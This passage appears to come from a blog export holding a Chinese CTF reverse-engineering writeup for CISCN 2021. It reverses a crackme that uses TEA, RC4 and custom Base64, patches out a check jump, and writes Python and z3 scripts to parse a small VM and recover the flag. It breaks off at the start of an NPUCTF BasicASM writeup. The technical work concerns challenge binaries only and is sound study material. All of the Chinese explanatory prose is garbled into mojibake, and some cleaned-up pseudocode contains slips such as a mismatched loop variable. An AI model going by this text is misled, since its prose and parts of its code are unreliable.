†å‡½æ•°ï¼Œè§‚å¯Ÿå‘ç°ï¼Œé€šå¸¸æ¯ä¸€ä¸ªforå¾ªç¯ä¸­ï¼ŒåŒ…è£¹äº†ä¸¤ä¸ªwhileå¾ªç¯ï¼Œä½†æ¯”èµ›çš„æ—¶å€™ä¸€ç›´ä»¥forå¾ªç¯ä¸ºå•ä½åœ¨æƒ³ä»£ç çš„å«ä¹‰ï¼Œæ™šä¸Šå†çœ‹çš„æ—¶å€™æ‰å‘ç°ï¼Œæ¯ä¸€ä¸ªwhileå¾ªç¯æ‰æ˜¯ä¸€ä¸ªå•ä½å‡½æ•°\nv1155 = ll; v1154 = 1i64; v1153 = ll \u0026amp; 1; v1152 = ll ^ 1; while ( v1153 ) { v1151 = v1152; v1150 = 2 * v1153; v1153 = (2 * v1153) \u0026amp; v1152; v1152 ^= v1150; } ll = v1152; v1041 = v1043; v1040 = v1045; v1039 = v1045 \u0026amp; v1043; v1038 = v1045 ^ v1043; // è¿ç®—ç®€åŒ–æ–¹æ³•ï¼š^ æ¢æˆ +ï¼Œç„¶ååªä¿ç•™è¿™ä¸€è¡Œå’Œæœ€åä¸€è¡Œ while ( v1039 ) { v1037 = v1038; v1036 = 2 * v1039; v1039 = (2 * v1039) \u0026amp; v1038; v1038 ^= v1036; } v1043 = v1038; ç®€å•åœ°è¯´ï¼Œä¸Šé¢è¿™æ®µä»£ç ï¼Œæœ€ç»ˆçš„æ‰§è¡Œæ•ˆæœå°±æ˜¯ï¼Œll = ll + 1ï¼Œæ¨å¹¿åˆ°ä¸‹åŠéƒ¨åˆ†ï¼Œå°±æ˜¯ v1043 = v1038 = v1043 + v1045\nå¥½äº†ï¼Œåˆ°æ­¤ï¼Œå°±å¯ä»¥å®Œæˆç®€åŒ–äº†ï¼Œä¹‹åå°±å˜æˆäº†ä¸€ä¸ªforå¾ªç¯é‡Œé¢ä¸€æ¡è‡ªå¢çš„è¯­å¥ï¼Œæ‰€ä»¥å°±è½¬æ¢æˆäº†ä¹˜æ³•\næ‰‹åŠ¨å°†è¿™äº›ä»£ç æ•´ç†å¥½çœ‹ä¸€ç‚¹ï¼Œå°±é•¿ä¸‹é¢è¿™æ ·äº†\nfor ( ii = 0; ii \u0026lt; 4; ++i) { v1043 = ii * 8; v1169 = \u0026amp;list_a_v19[4 * ii]; input_1 = input + v1043; input_2 = input + v1043 + 4; sum = 0; delta = 3 * 884811923; key0 = v1169[0]; key1 = v1169[1]; key2 = v1169[2]; key3 = v1169[3]; for ( mm = 0; mm \u0026lt;= 0x1F; mm++ ) { sum = delta + sum; v1135 = 16 * input_2; v1118 = key0 + v1135; v1112 = sum + input_2; v1109 = input_2 \u0026gt;\u0026gt; 5; v1106 = key1 + v1109; input_1 += v1102; v1095 = 16 * v1100; v1078 = key2 + v1095; v1072 = sum + input_1; v1069 = input_1 \u0026gt;\u0026gt; 5; v1066 = key3 + v1069; input_2 += v1062; } v1170[0] = input_1; v1170[1] = input_2; } ç»è¿‡äº†ä¸€äº›æ‰‹åŠ¨å¤„ç†ï¼Œå¾—åˆ°äº†ä¸Šé¢çš„ä¼ªä»£ç ï¼Œæ˜¾ç„¶å°±æ˜¯TEAå‘—ï¼Œç¬¬ä¸€å…³å°±è¿™ä¹ˆè¿‡äº†\nv510 = \u0026#34;Th1nkMyfr1end\u0026#34;; v507 = 0; char v18[256] = {}; v504 = 0; for ( i5 = 0; i5 \u0026lt; 256; i5++ ) { v17[i5] = i5; v18[i5] = v510[i5 % 13]; } for ( i5 = 0; i5 \u0026lt; 256; i5++ ) { v1 = v18[i5]; v2 = v17[i5]; v380 = v2 + v507; v371 = v1 + v380; v507 = v371 % 256; v504 = v17[i5]; v17[i5] = v17[v507]; v17[v507] = v504; } v511 = 32; v507 = 0; i5 = 0; for ( i17 = 0; v511 \u0026gt; i17; i17++ ) { i5 = (i5 + 1) % 256; // i = i + 1 v3 = v17[i5]; // S[i] v507 = (v3 + v507) % 256; // j = (j + S[i]) % 256 v155 = v17[i5]; v17[i5] = v17[v507]; v17[v507] = v155; // S[i], S[j] = S[j], S[i] v103 = v17[v507] + v17[i5]; // S[i] + S[j] input[i17] ^= v17[v103 % 256]; // data ^= S[(S[i] + S[j]) % 256] } 256çš„SBOXï¼Œä¸”ä»…è¿›è¡Œä¸€æ¬¡å¼‚æˆ–ï¼Œæœæ–­RC4\nä¸­é—´è§åˆ°äº†è¿™æ ·çš„ä¸œè¥¿\nv100 = v103 v98 = v103 / v120; v97 = v120; v96 = v97 * v98; // å»é™¤forå¾ªç¯å v506 = v100 - v96; $v103 - (v120 * (v103 / v120)) = v103 - (v103 - (v103 % v120))$ï¼Œæ˜¾ç„¶å°±æ˜¯å–æ¨¡è¿ç®—äº†\néšåæ˜¯è¿™ä¸ª\nv1013 = (__int64)input; v1012 = (__int64)v20; v1011 = strlen(input); for ( i31 = 0; i31 \u0026lt; 65; ++i31 ) { v978 = 3 * 823 * 5; // 12345 v948 = i31 * 0x114514; v18[i31] = v948 % v978; } while ( v1011 \u0026gt; 2 ) { v6 = *(_BYTE *)v1013 \u0026gt;\u0026gt; 2; *(_BYTE *)v1012 = v18[v6 \u0026amp; 0x3f]; v1012 += 1; *(_BYTE *)v1012 = v18[(16 * (v1013[0] \u0026amp; 3)) | (v1013[1] \u0026gt;\u0026gt; 4) \u0026amp; 0x0f]; v1012 += 1; v818 = 4 * (v1013[1] \u0026amp; 0x0f); v10 = *(_BYTE *)(v1013 + 2) \u0026gt;\u0026gt; 6; v804 = 2; v803 = 1; v802 = 0; v801 = 3; *(_BYTE *)v1012 = v18[v818 | v10 \u0026amp; 3]; v1012 += 1; v11 = v1013[2]; v5 = (unsigned __int8)v18[v11 \u0026amp; 0x63]; *(_BYTE *)v1012 = v5; v1012 += 1; v1011 = ~(~v1011 + 3); // v1011 -= 3 v1013 += 3; } if ( v1011 ) { v12 = *(_BYTE *)v1013 \u0026gt;\u0026gt; 2; *(_BYTE *)v1012 = v18[v12 \u0026amp; 0x3f]; v1012++; if ( v1011 \u0026lt;= 1 ) { v16 = *(_BYTE *)v1013; v640 = (v16 \u0026amp; 3) \u0026lt;\u0026lt; 4; *(_BYTE *)v1012 = v18[v640]; v1012++; v586 = 64; *(_BYTE *)v1012 = v18[v586]; v1012++; } else { v13 = *(_BYTE *)v1013; v720 = (v13 \u0026amp; 3) \u0026lt;\u0026lt; 4; v14 = *(_BYTE *)(v1013 + 1) \u0026gt;\u0026gt; 4; *(_BYTE *)v1012 = v18[v720 | v14 \u0026amp; 0xf]; v1012++; v15 = *(unsigned __int8 *)(v1013 + 1); v666 = (v15 \u0026amp; 0xf) \u0026lt;\u0026lt; 2; *(_BYTE *)v1012 = v18[v666]; v1012++; } v564 = 8; v548 = 8; v534 = v548; v533 = v564; v532 = 64; *(_BYTE *)v1012 = (unsigned __int8)v18[v532]; v1012++; } ç¬¬ä¸€ä¸ªforå¾ªç¯æ˜¯v18çš„ç”Ÿæˆï¼Œåé¢æ˜¯ä¸ªbase64æ¢è¡¨æ¢æˆv18çš„\næ ¹æ®å­—ç¬¦ä¸²æç¤ºï¼Œåé¢å°±æ˜¯checkäº†ï¼Œä½†è¿™éƒ¨åˆ†å¥½åƒåç¼–è¯‘ä¸å‡ºæ¥\nçœ‹äº†ä¸‹æ±‡ç¼–ï¼ˆpatchå‰çš„å¿˜è®°å­˜äº†ï¼‰\n07FF7D3CE9906 lea rcx, aWowThatIsAmazi ; \u0026#34;Wow.....That is amazing.......You actua\u0026#34;... .text:00007FF7D3CE990D call print .text:00007FF7D3CE9912 mov [rbp+2A80h+var_14], 0 .text:00007FF7D3CE991C jmp loc_7FF7D3CE9A16 .text:00007FF7D3CE9A16 loc_7FF7D3CE9A16: ; CODE XREF: sub_7FF7D3CE15E2+833Aâ†‘j .text:00007FF7D3CE9A16 nop .text:00007FF7D3CE9A17 nop .text:00007FF7D3CE9A18 nop .text:00007FF7D3CE9A19 nop .text:00007FF7D3CE9A1A nop .text:00007FF7D3CE9A1B nop .text:00007FF7D3CE9A1C nop .text:00007FF7D3CE9A1D nop .text:00007FF7D3CE9A1E nop .text:00007FF7D3CE9A1F nop .text:00007FF7D3CE9A20 nop .text:00007FF7D3CE9A21 nop .text:00007FF7D3CE9A22 nop .text:00007FF7D3CE9A23 nop .text:00007FF7D3CE9A24 nop .text:00007FF7D3CE9A25 nop .text:00007FF7D3CE9A26 lea rcx, aOkYouWinTheRes ; \u0026#34;Ok you win. The result will be shown la\u0026#34;... .text:00007FF7D3CE9A2D call print .text:00007FF7D3CE9A32 mov [rbp+2A80h+var_18], 0 .text:00007FF7D3CE9A3C jmp loc_7FF7D3CE9B1A æœ¬æ¥æœ‰ä¸€ä¸ªåˆ¤æ–­å’Œä¸€ä¸ªè·³è½¬ï¼Œç›´æ¥patchæ‰ï¼Œä¸­é—´åº”è¯¥æ˜¯ä¸€äº›æµªè´¹æ—¶é—´çš„ä¸œè¥¿ï¼Œå†é‡æ–°åç¼–è¯‘ä¸€ä¸‹ï¼Œå°±èƒ½çœ‹åˆ°checkéƒ¨åˆ†äº†\nv1272 = 0; while ( 1 ) { v37 = 49; if ( v1272 \u0026gt;= v37 ) break; if ( *((_BYTE *)v21 + v1272) != *((_BYTE *)off_7FF7D3D02010 + v1272) ) { print((__int64)\u0026#34;No\\n\u0026#34;); return; } /* ä»å†…å­˜ä¸­å–å‡ºçš„æ•°æ® unsigned char off_7FF7D3D02010[] = { 0x06, 0xAB, 0x05, 0x6A, 0xA0, 0x72, 0x71, 0x0D, 0x0A, 0x6F, 0xAC, 0x15, 0x05, 0xA5, 0x76, 0x41, 0x0A, 0x77, 0x13, 0xD8, 0x69, 0x03, 0x14, 0x78, 0xD5, 0xA8, 0x44, 0x0F, 0xA7, 0x76, 0x05, 0xAA, 0xA4, 0x09, 0x69, 0xA7, 0x0B, 0x11, 0x15, 0x42, 0x11, 0x72, 0x14, 0xAD, 0x00, 0x00, 0x00, 0x00 }; */ v1272 += 1; } è‡³æ­¤å…¨éƒ¨åˆ†æå®Œæ¯•ï¼Œä¾æ¬¡è¿›è¡Œäº†TEAï¼ŒRC4å’ŒBase64ï¼Œä¸­é—´è¿›è¡Œäº†å¯†é’¥ç”Ÿæˆï¼Œæœ€ååšä¸ªåå‘è¿›è¡Œè§£å¯†å³å¯ã€‚\nè¡¥å……ï¼šé™æ€åˆ†æwhileè¯­å¥å®ç°çš„åŠ æ³•è¿ç®— ä¹‹å‰çš„åˆ†æå…¶å®æ˜¯ç”¨pythonå®ç°ä¸€éï¼Œç„¶åæ‰¾è§„å¾‹å¾—åˆ°çš„ï¼ˆæ¯•ç«Ÿä¸ºäº†é€Ÿåº¦ï¼‰ï¼Œä½†è¿˜æ˜¯åº”è¯¥ç¨å¾®é™æ€åˆ†æä¸€ä¸‹å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆäº‹æƒ…\nçœ‹çš„æ—¶å€™å°±æ„Ÿè§‰å¾ˆåƒæ˜¯æ•°ç”µä¸­çš„åŠ æ³•å™¨ï¼Œè¿˜æ˜¯ç”¨ç®€å•çš„ä¾‹å­åˆ†æä¸€ä¸‹ï¼ˆåˆ å»äº†æ²¡æœ‰ç”¨åˆ°çš„è¯­å¥ï¼‰\nv1153 = ll \u0026amp; 1; // åˆ¤æ–­ç»“å°¾æ˜¯å¦ä¸º1 v1152 = ll ^ 1; // å¦‚æœç»“å°¾æ˜¯1ï¼Œå°†å…¶å˜ä¸º0 // å¦‚æœç»“å°¾æ˜¯0ï¼Œå°†å…¶å˜ä¸º1 while ( v1153 ) { // å¦‚æœæ­¤å‰ç»“å°¾ä¸º1ï¼Œå°†ä¼šæ¶‰åŠåˆ°è¿›ä½çš„é—®é¢˜ï¼Œå› æ­¤è¿›å…¥å¾ªç¯ // å¦‚æœæ­¤å‰ç»“å°¾ä¸º0ï¼Œå°±æ²¡æœ‰è¿›ä½çš„é—®é¢˜äº†ï¼Œæ— éœ€è¿›å…¥å¾ªç¯ v1150 = 2 * v1153; // å°†ç»“å°¾å·¦ç§»1 v1153 = (2 * v1153) \u0026amp; v1152; // ä¸åŠ æ³•ä¹‹åçš„ç»“æœå†è¿›è¡Œä¸€æ¬¡æŒ‰ä½ä¸ï¼Œè¿™ä¸ªçš„ç›®çš„æ˜¯çœ‹æ¥ä¸‹æ¥æ˜¯å¦è¿˜éœ€è¦è¿›ä½ v1152 ^= v1150; // è¿›è¡Œæ— è¿›ä½åŠ æ³• } // ä»€ä¹ˆæ—¶å€™ä¸ä¼šäº§ç”Ÿè¿›ä½çš„é—®é¢˜äº†ï¼Œä»€ä¹ˆæ—¶å€™å°±å¯ä»¥é€€å‡ºå¾ªç¯äº† ll = v1152; ç®€å•çš„è¯´ï¼Œå°±æ˜¯ç”¨å¼‚æˆ–è¿ç®—ä½œä¸ºæ— è¿›ä½çš„åŠ æ³•ï¼Œç„¶åé€šè¿‡ä¸€ä¸ªwhileå¾ªç¯æ¥å®Œæˆè¿›ä½\nvs è¿™é“é¢˜å°±æ¯”èµ›çš„æ—¶å€™ç®€å•çœ‹äº†ä¸€ä¸‹ï¼Œé€†å‘éš¾åº¦å¾ˆä½ï¼Œä»ä¸€ä¸ªæ–‡ä»¶è¯»å–æŒ‡ä»¤ï¼Œå¦ä¸€ä¸ªæ–‡ä»¶å½“ä½œå†…å­˜ï¼ŒvmæŒ‡ä»¤å…¶å®ä¸éš¾ï¼Œä½†æ–‡ä»¶ä¸­çš„æŒ‡ä»¤å¾ˆå¤šï¼Œéœ€è¦æ‰‹å†™ä¸€ä¸ªvmçš„åˆ†æä»£ç ã€‚\nå†™å®Œä¹‹åå‘ç°è¡Œæ•°ç•¥å¤šï¼Œå…ˆæ‰‹åŠ¨åˆ†ææ‰¾äº†æ‰¾è§„å¾‹ï¼Œç„¶åå†™äº†ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬æå–ï¼Œç”Ÿæˆpythonä»£ç ï¼Œç›´æ¥æ‹¿flagã€‚\nvmçš„è§£æè„šæœ¬ vmreader.py:\nmemory = [ 0x0C, 0xF4, 0x5F, 0xE9, 0xF2, 0xE6, 0x87, 0x4C, 0x5E, 0x61, 0x11, 0x7B, 0xF0, 0x11, 0x7F, 0xB4, 0xB2, 0xEB, 0x65, 0xE2, 0x15, 0xC6, 0x8B, 0x02, 0x8C, 0xC1, 0x50, 0xD0, 0x0D, 0xA1, 0xCD, 0x3A ] cnt = 0 class OPCode: def __init__(self, code_len, code, arglen, pes_code): self.code_len = code_len self.code = code self.arglen = arglen self.pes_code = pes_code class Reader: def __init__(self, file): self.index = 0 self.buf = open(file, \u0026#39;rb\u0026#39;).read() self.length = len(self.buf) self.asm = [] def add_asm(self, asm: OPCode): self.asm.append(asm) def read(self): global cnt while len(self.buf) \u0026gt; 0: for a in self.asm: if a.code(self.buf[:a.code_len]): # self.output += a.pes_code op_code = self.buf[:a.code_len] self.buf = self.buf[a.code_len:] if op_code == b\u0026#39;\\xff\\xff\u0026#39; and self.buf[1] \u0026gt; 2: print (cnt, op_code) cnt += 1 break args = [_ for _ in self.buf[:a.arglen]] a.pes_code(op_code, args) self.buf = self.buf[a.arglen:] break else: print (cnt, self.buf[0]) cnt += 1 self.buf = self.buf[1:] def basic_io_code(op_code): if op_code == b\u0026#39;\\xFF\\xFF\u0026#39;: return True return False def basic_io_op(op_code, args): global cnt if args[1] == 2: if args[0] \u0026gt; 0x20 and args[0] \u0026lt; 0x7f: print (\u0026#39;%d print %c\u0026#39; % (cnt, args[0])) cnt += 2 else: print (\u0026#39;%d print \\\\x%02x\u0026#39; % (cnt, args[0])) cnt += 2 elif args[1] == 1: print (\u0026#39;%d mem[%d] = \u0026lt;input\u0026gt;\u0026#39; % (cnt, args[0])) cnt += 2 elif args[1] == 0: print (\u0026#39;%d exit(0)\u0026#39; % cnt) cnt += 2 else: print (op_code, args) def jmp_code(op_code): if int.from_bytes(op_code, \u0026#39;little\u0026#39;) \u0026amp; 0x8000 == 0: return True return False def jmp_op(op_code, args): global cnt pc = int.from_bytes(op_code, \u0026#39;little\u0026#39;) addr = pc \u0026amp; 0x1FF if (addr \u0026gt;\u0026gt; 3) \u0026gt; 31: if (memory[(addr \u0026gt;\u0026gt; 3) - 32] \u0026gt;\u0026gt; (addr \u0026amp; 7)) \u0026amp; 1 == 0: print (f\u0026#39;{cnt} goto {cnt + ((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) else: print (f\u0026#39;{cnt} nop\u0026#39;) else: print (\u0026#39;%d if ((mem[ %d ] \u0026gt;\u0026gt; %d ) \u0026amp; 1) == 0\u0026#39; % (cnt, addr \u0026gt;\u0026gt; 3, addr \u0026amp; 7), f\u0026#39;goto {cnt+((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) cnt += 1 def jmp2_code(op_code): if int.from_bytes(op_code, \u0026#39;little\u0026#39;) \u0026amp; 0x8000 != 0 and op_code != b\u0026#39;\\xff\\xff\u0026#39;: return True return False def jmp2_op(op_code, args): global cnt pc = int.from_bytes(op_code, \u0026#39;little\u0026#39;) addr = pc \u0026amp; 0x1FF if (addr \u0026gt;\u0026gt; 3) \u0026gt; 31: if (memory[(addr \u0026gt;\u0026gt; 3) - 32] \u0026gt;\u0026gt; (addr \u0026amp; 7)) \u0026amp; 1 != 0: print (f\u0026#39;{cnt} goto {cnt + ((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) else: print (f\u0026#39;{cnt} nop\u0026#39;) else: print (\u0026#39;%d if ((mem[ %d ] \u0026gt;\u0026gt; %d ) \u0026amp; 1) != 0\u0026#39; % (cnt, addr \u0026gt;\u0026gt; 3, addr \u0026amp; 7), f\u0026#39;goto {cnt+((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) cnt += 1 basic_io = OPCode(2, basic_io_code, 2, basic_io_op) r = Reader(\u0026#39;program\u0026#39;) jmp = OPCode(2, jmp_code, 0, jmp_op) jmp2 = OPCode(2, jmp2_code, 0, jmp2_op) r.add_asm(basic_io) r.add_asm(jmp) r.add_asm(jmp2) r.read() åˆ†ææŒ‡ä»¤ 0 print P 2 print l 4 print e 6 print a 8 print s 10 print e 12 print \\x20 14 print i 16 print n 18 print p 20 print u 22 print t 24 print \\x20 26 print y 28 print o 30 print u 32 print r 34 print \\x20 36 print f 38 print l 40 print a 42 print g 44 print : 46 print \\x20 48 mem[0] = \u0026lt;input\u0026gt; 50 mem[1] = \u0026lt;input\u0026gt; 52 mem[2] = \u0026lt;input\u0026gt; 54 mem[3] = \u0026lt;input\u0026gt; 56 mem[4] = \u0026lt;input\u0026gt; 58 mem[5] = \u0026lt;input\u0026gt; 60 mem[6] = \u0026lt;input\u0026gt; 62 mem[7] = \u0026lt;input\u0026gt; 64 mem[8] = \u0026lt;input\u0026gt; 66 mem[9] = \u0026lt;input\u0026gt; 68 mem[10] = \u0026lt;input\u0026gt; 70 mem[11] = \u0026lt;input\u0026gt; 72 mem[12] = \u0026lt;input\u0026gt; 74 mem[13] = \u0026lt;input\u0026gt; 76 mem[14] = \u0026lt;input\u0026gt; 78 mem[15] = \u0026lt;input\u0026gt; 80 mem[16] = \u0026lt;input\u0026gt; 82 mem[17] = \u0026lt;input\u0026gt; 84 mem[18] = \u0026lt;input\u0026gt; 86 mem[19] = \u0026lt;input\u0026gt; 88 mem[20] = \u0026lt;input\u0026gt; 90 mem[21] = \u0026lt;input\u0026gt; 92 mem[22] = \u0026lt;input\u0026gt; 94 mem[23] = \u0026lt;input\u0026gt; 96 mem[24] = \u0026lt;input\u0026gt; 98 mem[25] = \u0026lt;input\u0026gt; 100 mem[26] = \u0026lt;input\u0026gt; 102 mem[27] = \u0026lt;input\u0026gt; 104 mem[28] = \u0026lt;input\u0026gt; 106 mem[29] = \u0026lt;input\u0026gt; 108 mem[30] = \u0026lt;input\u0026gt; 110 mem[31] = \u0026lt;input\u0026gt; è¿™éƒ¨åˆ†æ˜¯ç®€å•çš„è¾“å‡ºå’Œè¾“å…¥ï¼Œç›´æ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶çš„å­—èŠ‚ä¹Ÿèƒ½çœ‹å‡ºæ¥\nç„¶åæ˜¯è¾“å…¥çš„åˆ¤æ–­éƒ¨åˆ†\n112 if ((mem[ 12 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) != 0 goto 125 113 nop 114 if ((mem[ 19 ] \u0026gt;\u0026gt; 2 ) \u0026amp; 1) == 0 goto 125 115 print N 117 print o 119 print ! 121 print \\x0a 123 exit(0) 125 goto 127 126 if ((mem[ 22 ] \u0026gt;\u0026gt; 6 ) \u0026amp; 1) != 0 goto 146 127 goto 131 128 if ((mem[ 1 ] \u0026gt;\u0026gt; 1 ) \u0026amp; 1) != 0 goto 140 129 if ((mem[ 0 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) != 0 goto 140 130 b\u0026#39;\\xff\\xff\u0026#39; 131 goto 133 132 b\u0026#39;\\xff\\xff\u0026#39; 133 if ((mem[ 30 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) == 0 goto 146 134 nop 135 nop 136 print N 138 print o 140 print ! 142 print \\x0a 144 exit(0) 146 nop 147 if ((mem[ 6 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 169 148 goto 150 149 b\u0026#39;\\xff\\xff\u0026#39; 150 goto 154 151 if ((mem[ 0 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) == 0 goto 163 152 if ((mem[ 3 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) != 0 goto 163 153 b\u0026#39;\\xff\\xff\u0026#39; 154 if ((mem[ 8 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 169 155 goto 159 156 if ((mem[ 1 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 168 157 if ((mem[ 1 ] \u0026gt;\u0026gt; 7 ) \u0026amp; 1) != 0 goto 168 158 b\u0026#39;\\xff\\xff\u0026#39; 159 print N 161 print o 163 print ! 165 print \\x0a 167 exit(0) 169 if ((mem[ 4 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 190 170 goto 172 171 b\u0026#39;\\xff\\xff\u0026#39; 172 if ((mem[ 20 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 190 173 nop 174 b\u0026#39;\\xff\\xff\u0026#39; 175 if ((mem[ 2 ] \u0026gt;\u0026gt; 1 ) \u0026amp; 1) != 0 goto 179 ; ç”±äºffffåä¼šç›´æ¥è·³è¿‡ä¸‹ä¸€ä¸ªï¼Œæ‰€ä»¥è¿™ä¸€å¥ä¹Ÿæ²¡æœ‰ç”¨ 176 goto 180 177 if ((mem[ 1 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) != 0 goto 189 178 if ((mem[ 3 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) == 0 goto 189 179 b\u0026#39;\\xff\\xff\u0026#39; 180 print N 182 print o 184 print ! 186 print \\x0a 188 exit(0) äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å‡ºç°äº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„ \\xFF\\xFFï¼Œæ„Ÿè§‰èµ·åˆ°äº†ä¸€éƒ¨åˆ†çš„èŠ±æŒ‡ä»¤ä½œç”¨ï¼Œæ‰€ä»¥å¯¹äºä¸æ»¡è¶³çš„æƒ…å†µå…¨éƒ¨æ‹†å¼€å¤„ç†äº†ï¼Œä½†è¿™åˆå¯¼è‡´è¯»å–åçš„é€»è¾‘ä¸æ˜¯å¾ˆæ¸…æ™°ï¼Œéœ€è¦è¿›è¡Œç®€å•çš„æ‰‹åŠ¨åˆ†æ\nç¨‹åºä¸­ if ((mem[ 1 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) != 0 ä¹‹é—´ç©ºæ ¼å®é™…ä¸Šæ˜¯ä¸ºäº†åç»­è¿›ä¸€æ­¥è¯»å–å‡†å¤‡çš„\nåˆ†ææ—¶å¯ä»¥çœ‹å‡ºï¼Œflagçš„åˆ¤æ–­é€»è¾‘æ˜¾ç„¶æ˜¯å¯¹è¾“å…¥çš„æ¯ä¸€æ¯”ç‰¹åŠ äº†é™å®šï¼Œç›®çš„å°±æ˜¯è·³è¿‡æ‰€æœ‰çš„é€€å‡º\nå¯¹è¿™ä¸€éƒ¨åˆ†æ‰‹åŠ¨åˆ†æï¼Œåˆ æ‰æ²¡æœ‰ç”¨çš„éƒ¨åˆ†\n112 if ((mem[ 12 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) != 0 goto 125 114 if ((mem[ 19 ] \u0026gt;\u0026gt; 2 ) \u0026amp; 1) == 0 goto 125 115 print No! 123 exit(0) 125 goto 127 126 if ((mem[ 22 ] \u0026gt;\u0026gt; 6 ) \u0026amp; 1) != 0 goto 146 ; è¿™å¥è¯ä¹Ÿæ²¡æœ‰ç”¨ï¼Œä½†è‡ªåŠ¨æå–æ—¶ä¸å®¹æ˜“å¤„ç†ï¼Œä»ç„¶ä¿ç•™ 127 goto 131 131 goto 133 133 if ((mem[ 30 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) == 0 goto 146 136 print No! 144 exit(0) 146 nop 147 if ((mem[ 6 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 169 148 goto 150 150 goto 154 154 if ((mem[ 8 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 169 155 goto 159 159 print No! 167 exit(0) 169 if ((mem[ 4 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 190 170 goto 172 172 if ((mem[ 20 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 190 173 nop 176 goto 180 180 print No! 188 exit(0) å¯ä»¥çœ‹åˆ°ï¼Œå¯ç”¨çš„è·³è½¬ä¸€å®šæ˜¯è·³è½¬åˆ°exitåé¢çš„ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬äº†\nextract.py\ninfile = open(\u0026#39;1.txt\u0026#39;) code = infile.read() code = code.split(\u0026#39;\\n\u0026#39;) target = [] for line in code: if \u0026#39;exit\u0026#39; in line: target.append(str(int(line.split(\u0026#39; \u0026#39;)[0]) + 2)) # print (target) for line in code: tmp = line.split(\u0026#39; \u0026#39;) if tmp[-1] in target: print (line) æœ€åå†è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªz3è„šæœ¬\ndef fmt(in_list): ret = \u0026#39;\u0026#39; if in_list[2] == \u0026#39;==\u0026#39;: ret += \u0026#39;eq(\u0026#39; elif in_list[2] == \u0026#39;!=\u0026#39;: ret += \u0026#39;neq(\u0026#39; ret += in_list[0] + \u0026#39;, \u0026#39; + in_list[1] ret += \u0026#39;)\u0026#39; return ret infile = open(\u0026#39;2.txt\u0026#39;) print (\u0026#39;\u0026#39;\u0026#39;from z3 import * s = Solver() flag = [BitVec(\u0026#39;flag%d\u0026#39; % i, 8) for i in range(32)] for f in flag: s.add(f \u0026gt; 0x20) s.add(f \u0026lt; 0x7f) def eq(pos_f, pos_b): return flag[pos_f] \u0026amp; (1 \u0026lt;\u0026lt; pos_b) == 0 def neq(pos_f, pos_b): return flag[pos_f] \u0026amp; (1 \u0026lt;\u0026lt; pos_b) != 0 \u0026#39;\u0026#39;\u0026#39;) lines = infile.read() lines = lines.split(\u0026#39;\\n\u0026#39;) for i in range(0, len(lines) - 1, 2): a, b = lines[i], lines[i + 1] a = a.split(\u0026#39; \u0026#39;) b = b.split(\u0026#39; \u0026#39;) a = [a[3], a[6], a[-4]] b = [b[3], b[6], b[-4]] print (\u0026#39;s.add(Or(\u0026#39; + fmt(a) + \u0026#39;, \u0026#39; + fmt(b) + \u0026#39;))\u0026#39;) print (\u0026#39;\u0026#39;\u0026#39; if s.check() == sat: model = s.model() for f in flag: print (chr(model[f].as_long().real), end = \u0026#39;\u0026#39;) print (\u0026#39;\\\\nfinish\u0026#39;)\u0026#39;\u0026#39;\u0026#39;) è¿è¡Œä¹‹åå°±å¯ä»¥å¾—åˆ°flagäº†\n# python3 vmreader.py \u0026gt; 1.txt # python3 extract.py \u0026gt; 2.txt # python3 to_py.py \u0026gt; 3.py # python3 3.py flag{_2_SAT_15_a_P_pr0b13M_4F6v} finish # ./vs Please input your flag: flag{_2_SAT_15_a_P_pr0b13M_4F6v} Congratulation! é€šè¿‡ç¨‹åºéªŒè¯\næ€»ç»“ è¿˜æ˜¯ç¬¬ä¸€æ¬¡åœ¨ä¸€ä¸ªé€†å‘é¢˜ç›®ä¸­å†™è¿™ä¹ˆå¤šä»£ç ï¼Œæœ€è¿‘åˆçœ‹åˆ°ä¸€äº›éœ€è¦å†™ä»£ç çš„é¢˜ç›®ï¼Œè¿˜æ˜¯éœ€è¦æé«˜å¼€å‘èƒ½åŠ›å•Š\n","date":"2021-06-22T23:25:43Z","permalink":"/post/ciscn-n-2021-re-writeup/","title":"CISCN-N 2021 RE Writeup"},{"content":"[NPUCTF2020]BasicASM çº¯è€ƒå¯Ÿæ±‡ç¼–çš„é¢˜ç›®ï¼Œæœ‰è€ƒè™‘æƒ³åŠæ³•æ”¹æˆæ­£ç¡®çš„æ±‡ç¼–å½¢å¼ç„¶åç¼–è¯‘ç”¨idaçœ‹ï¼Œä½†æ„Ÿè§‰å°±å¤±å»æ„ä¹‰äº†ï¼Œäºæ˜¯ç¡¬å•ƒæ±‡ç¼–\n00007FF7A8AC5A50 push rbp 00007FF7A8AC5A52 push rdi 00007FF7A8AC5A53 sub rsp,238h 00007FF7A8AC5A5A lea rbp,[rsp+20h] 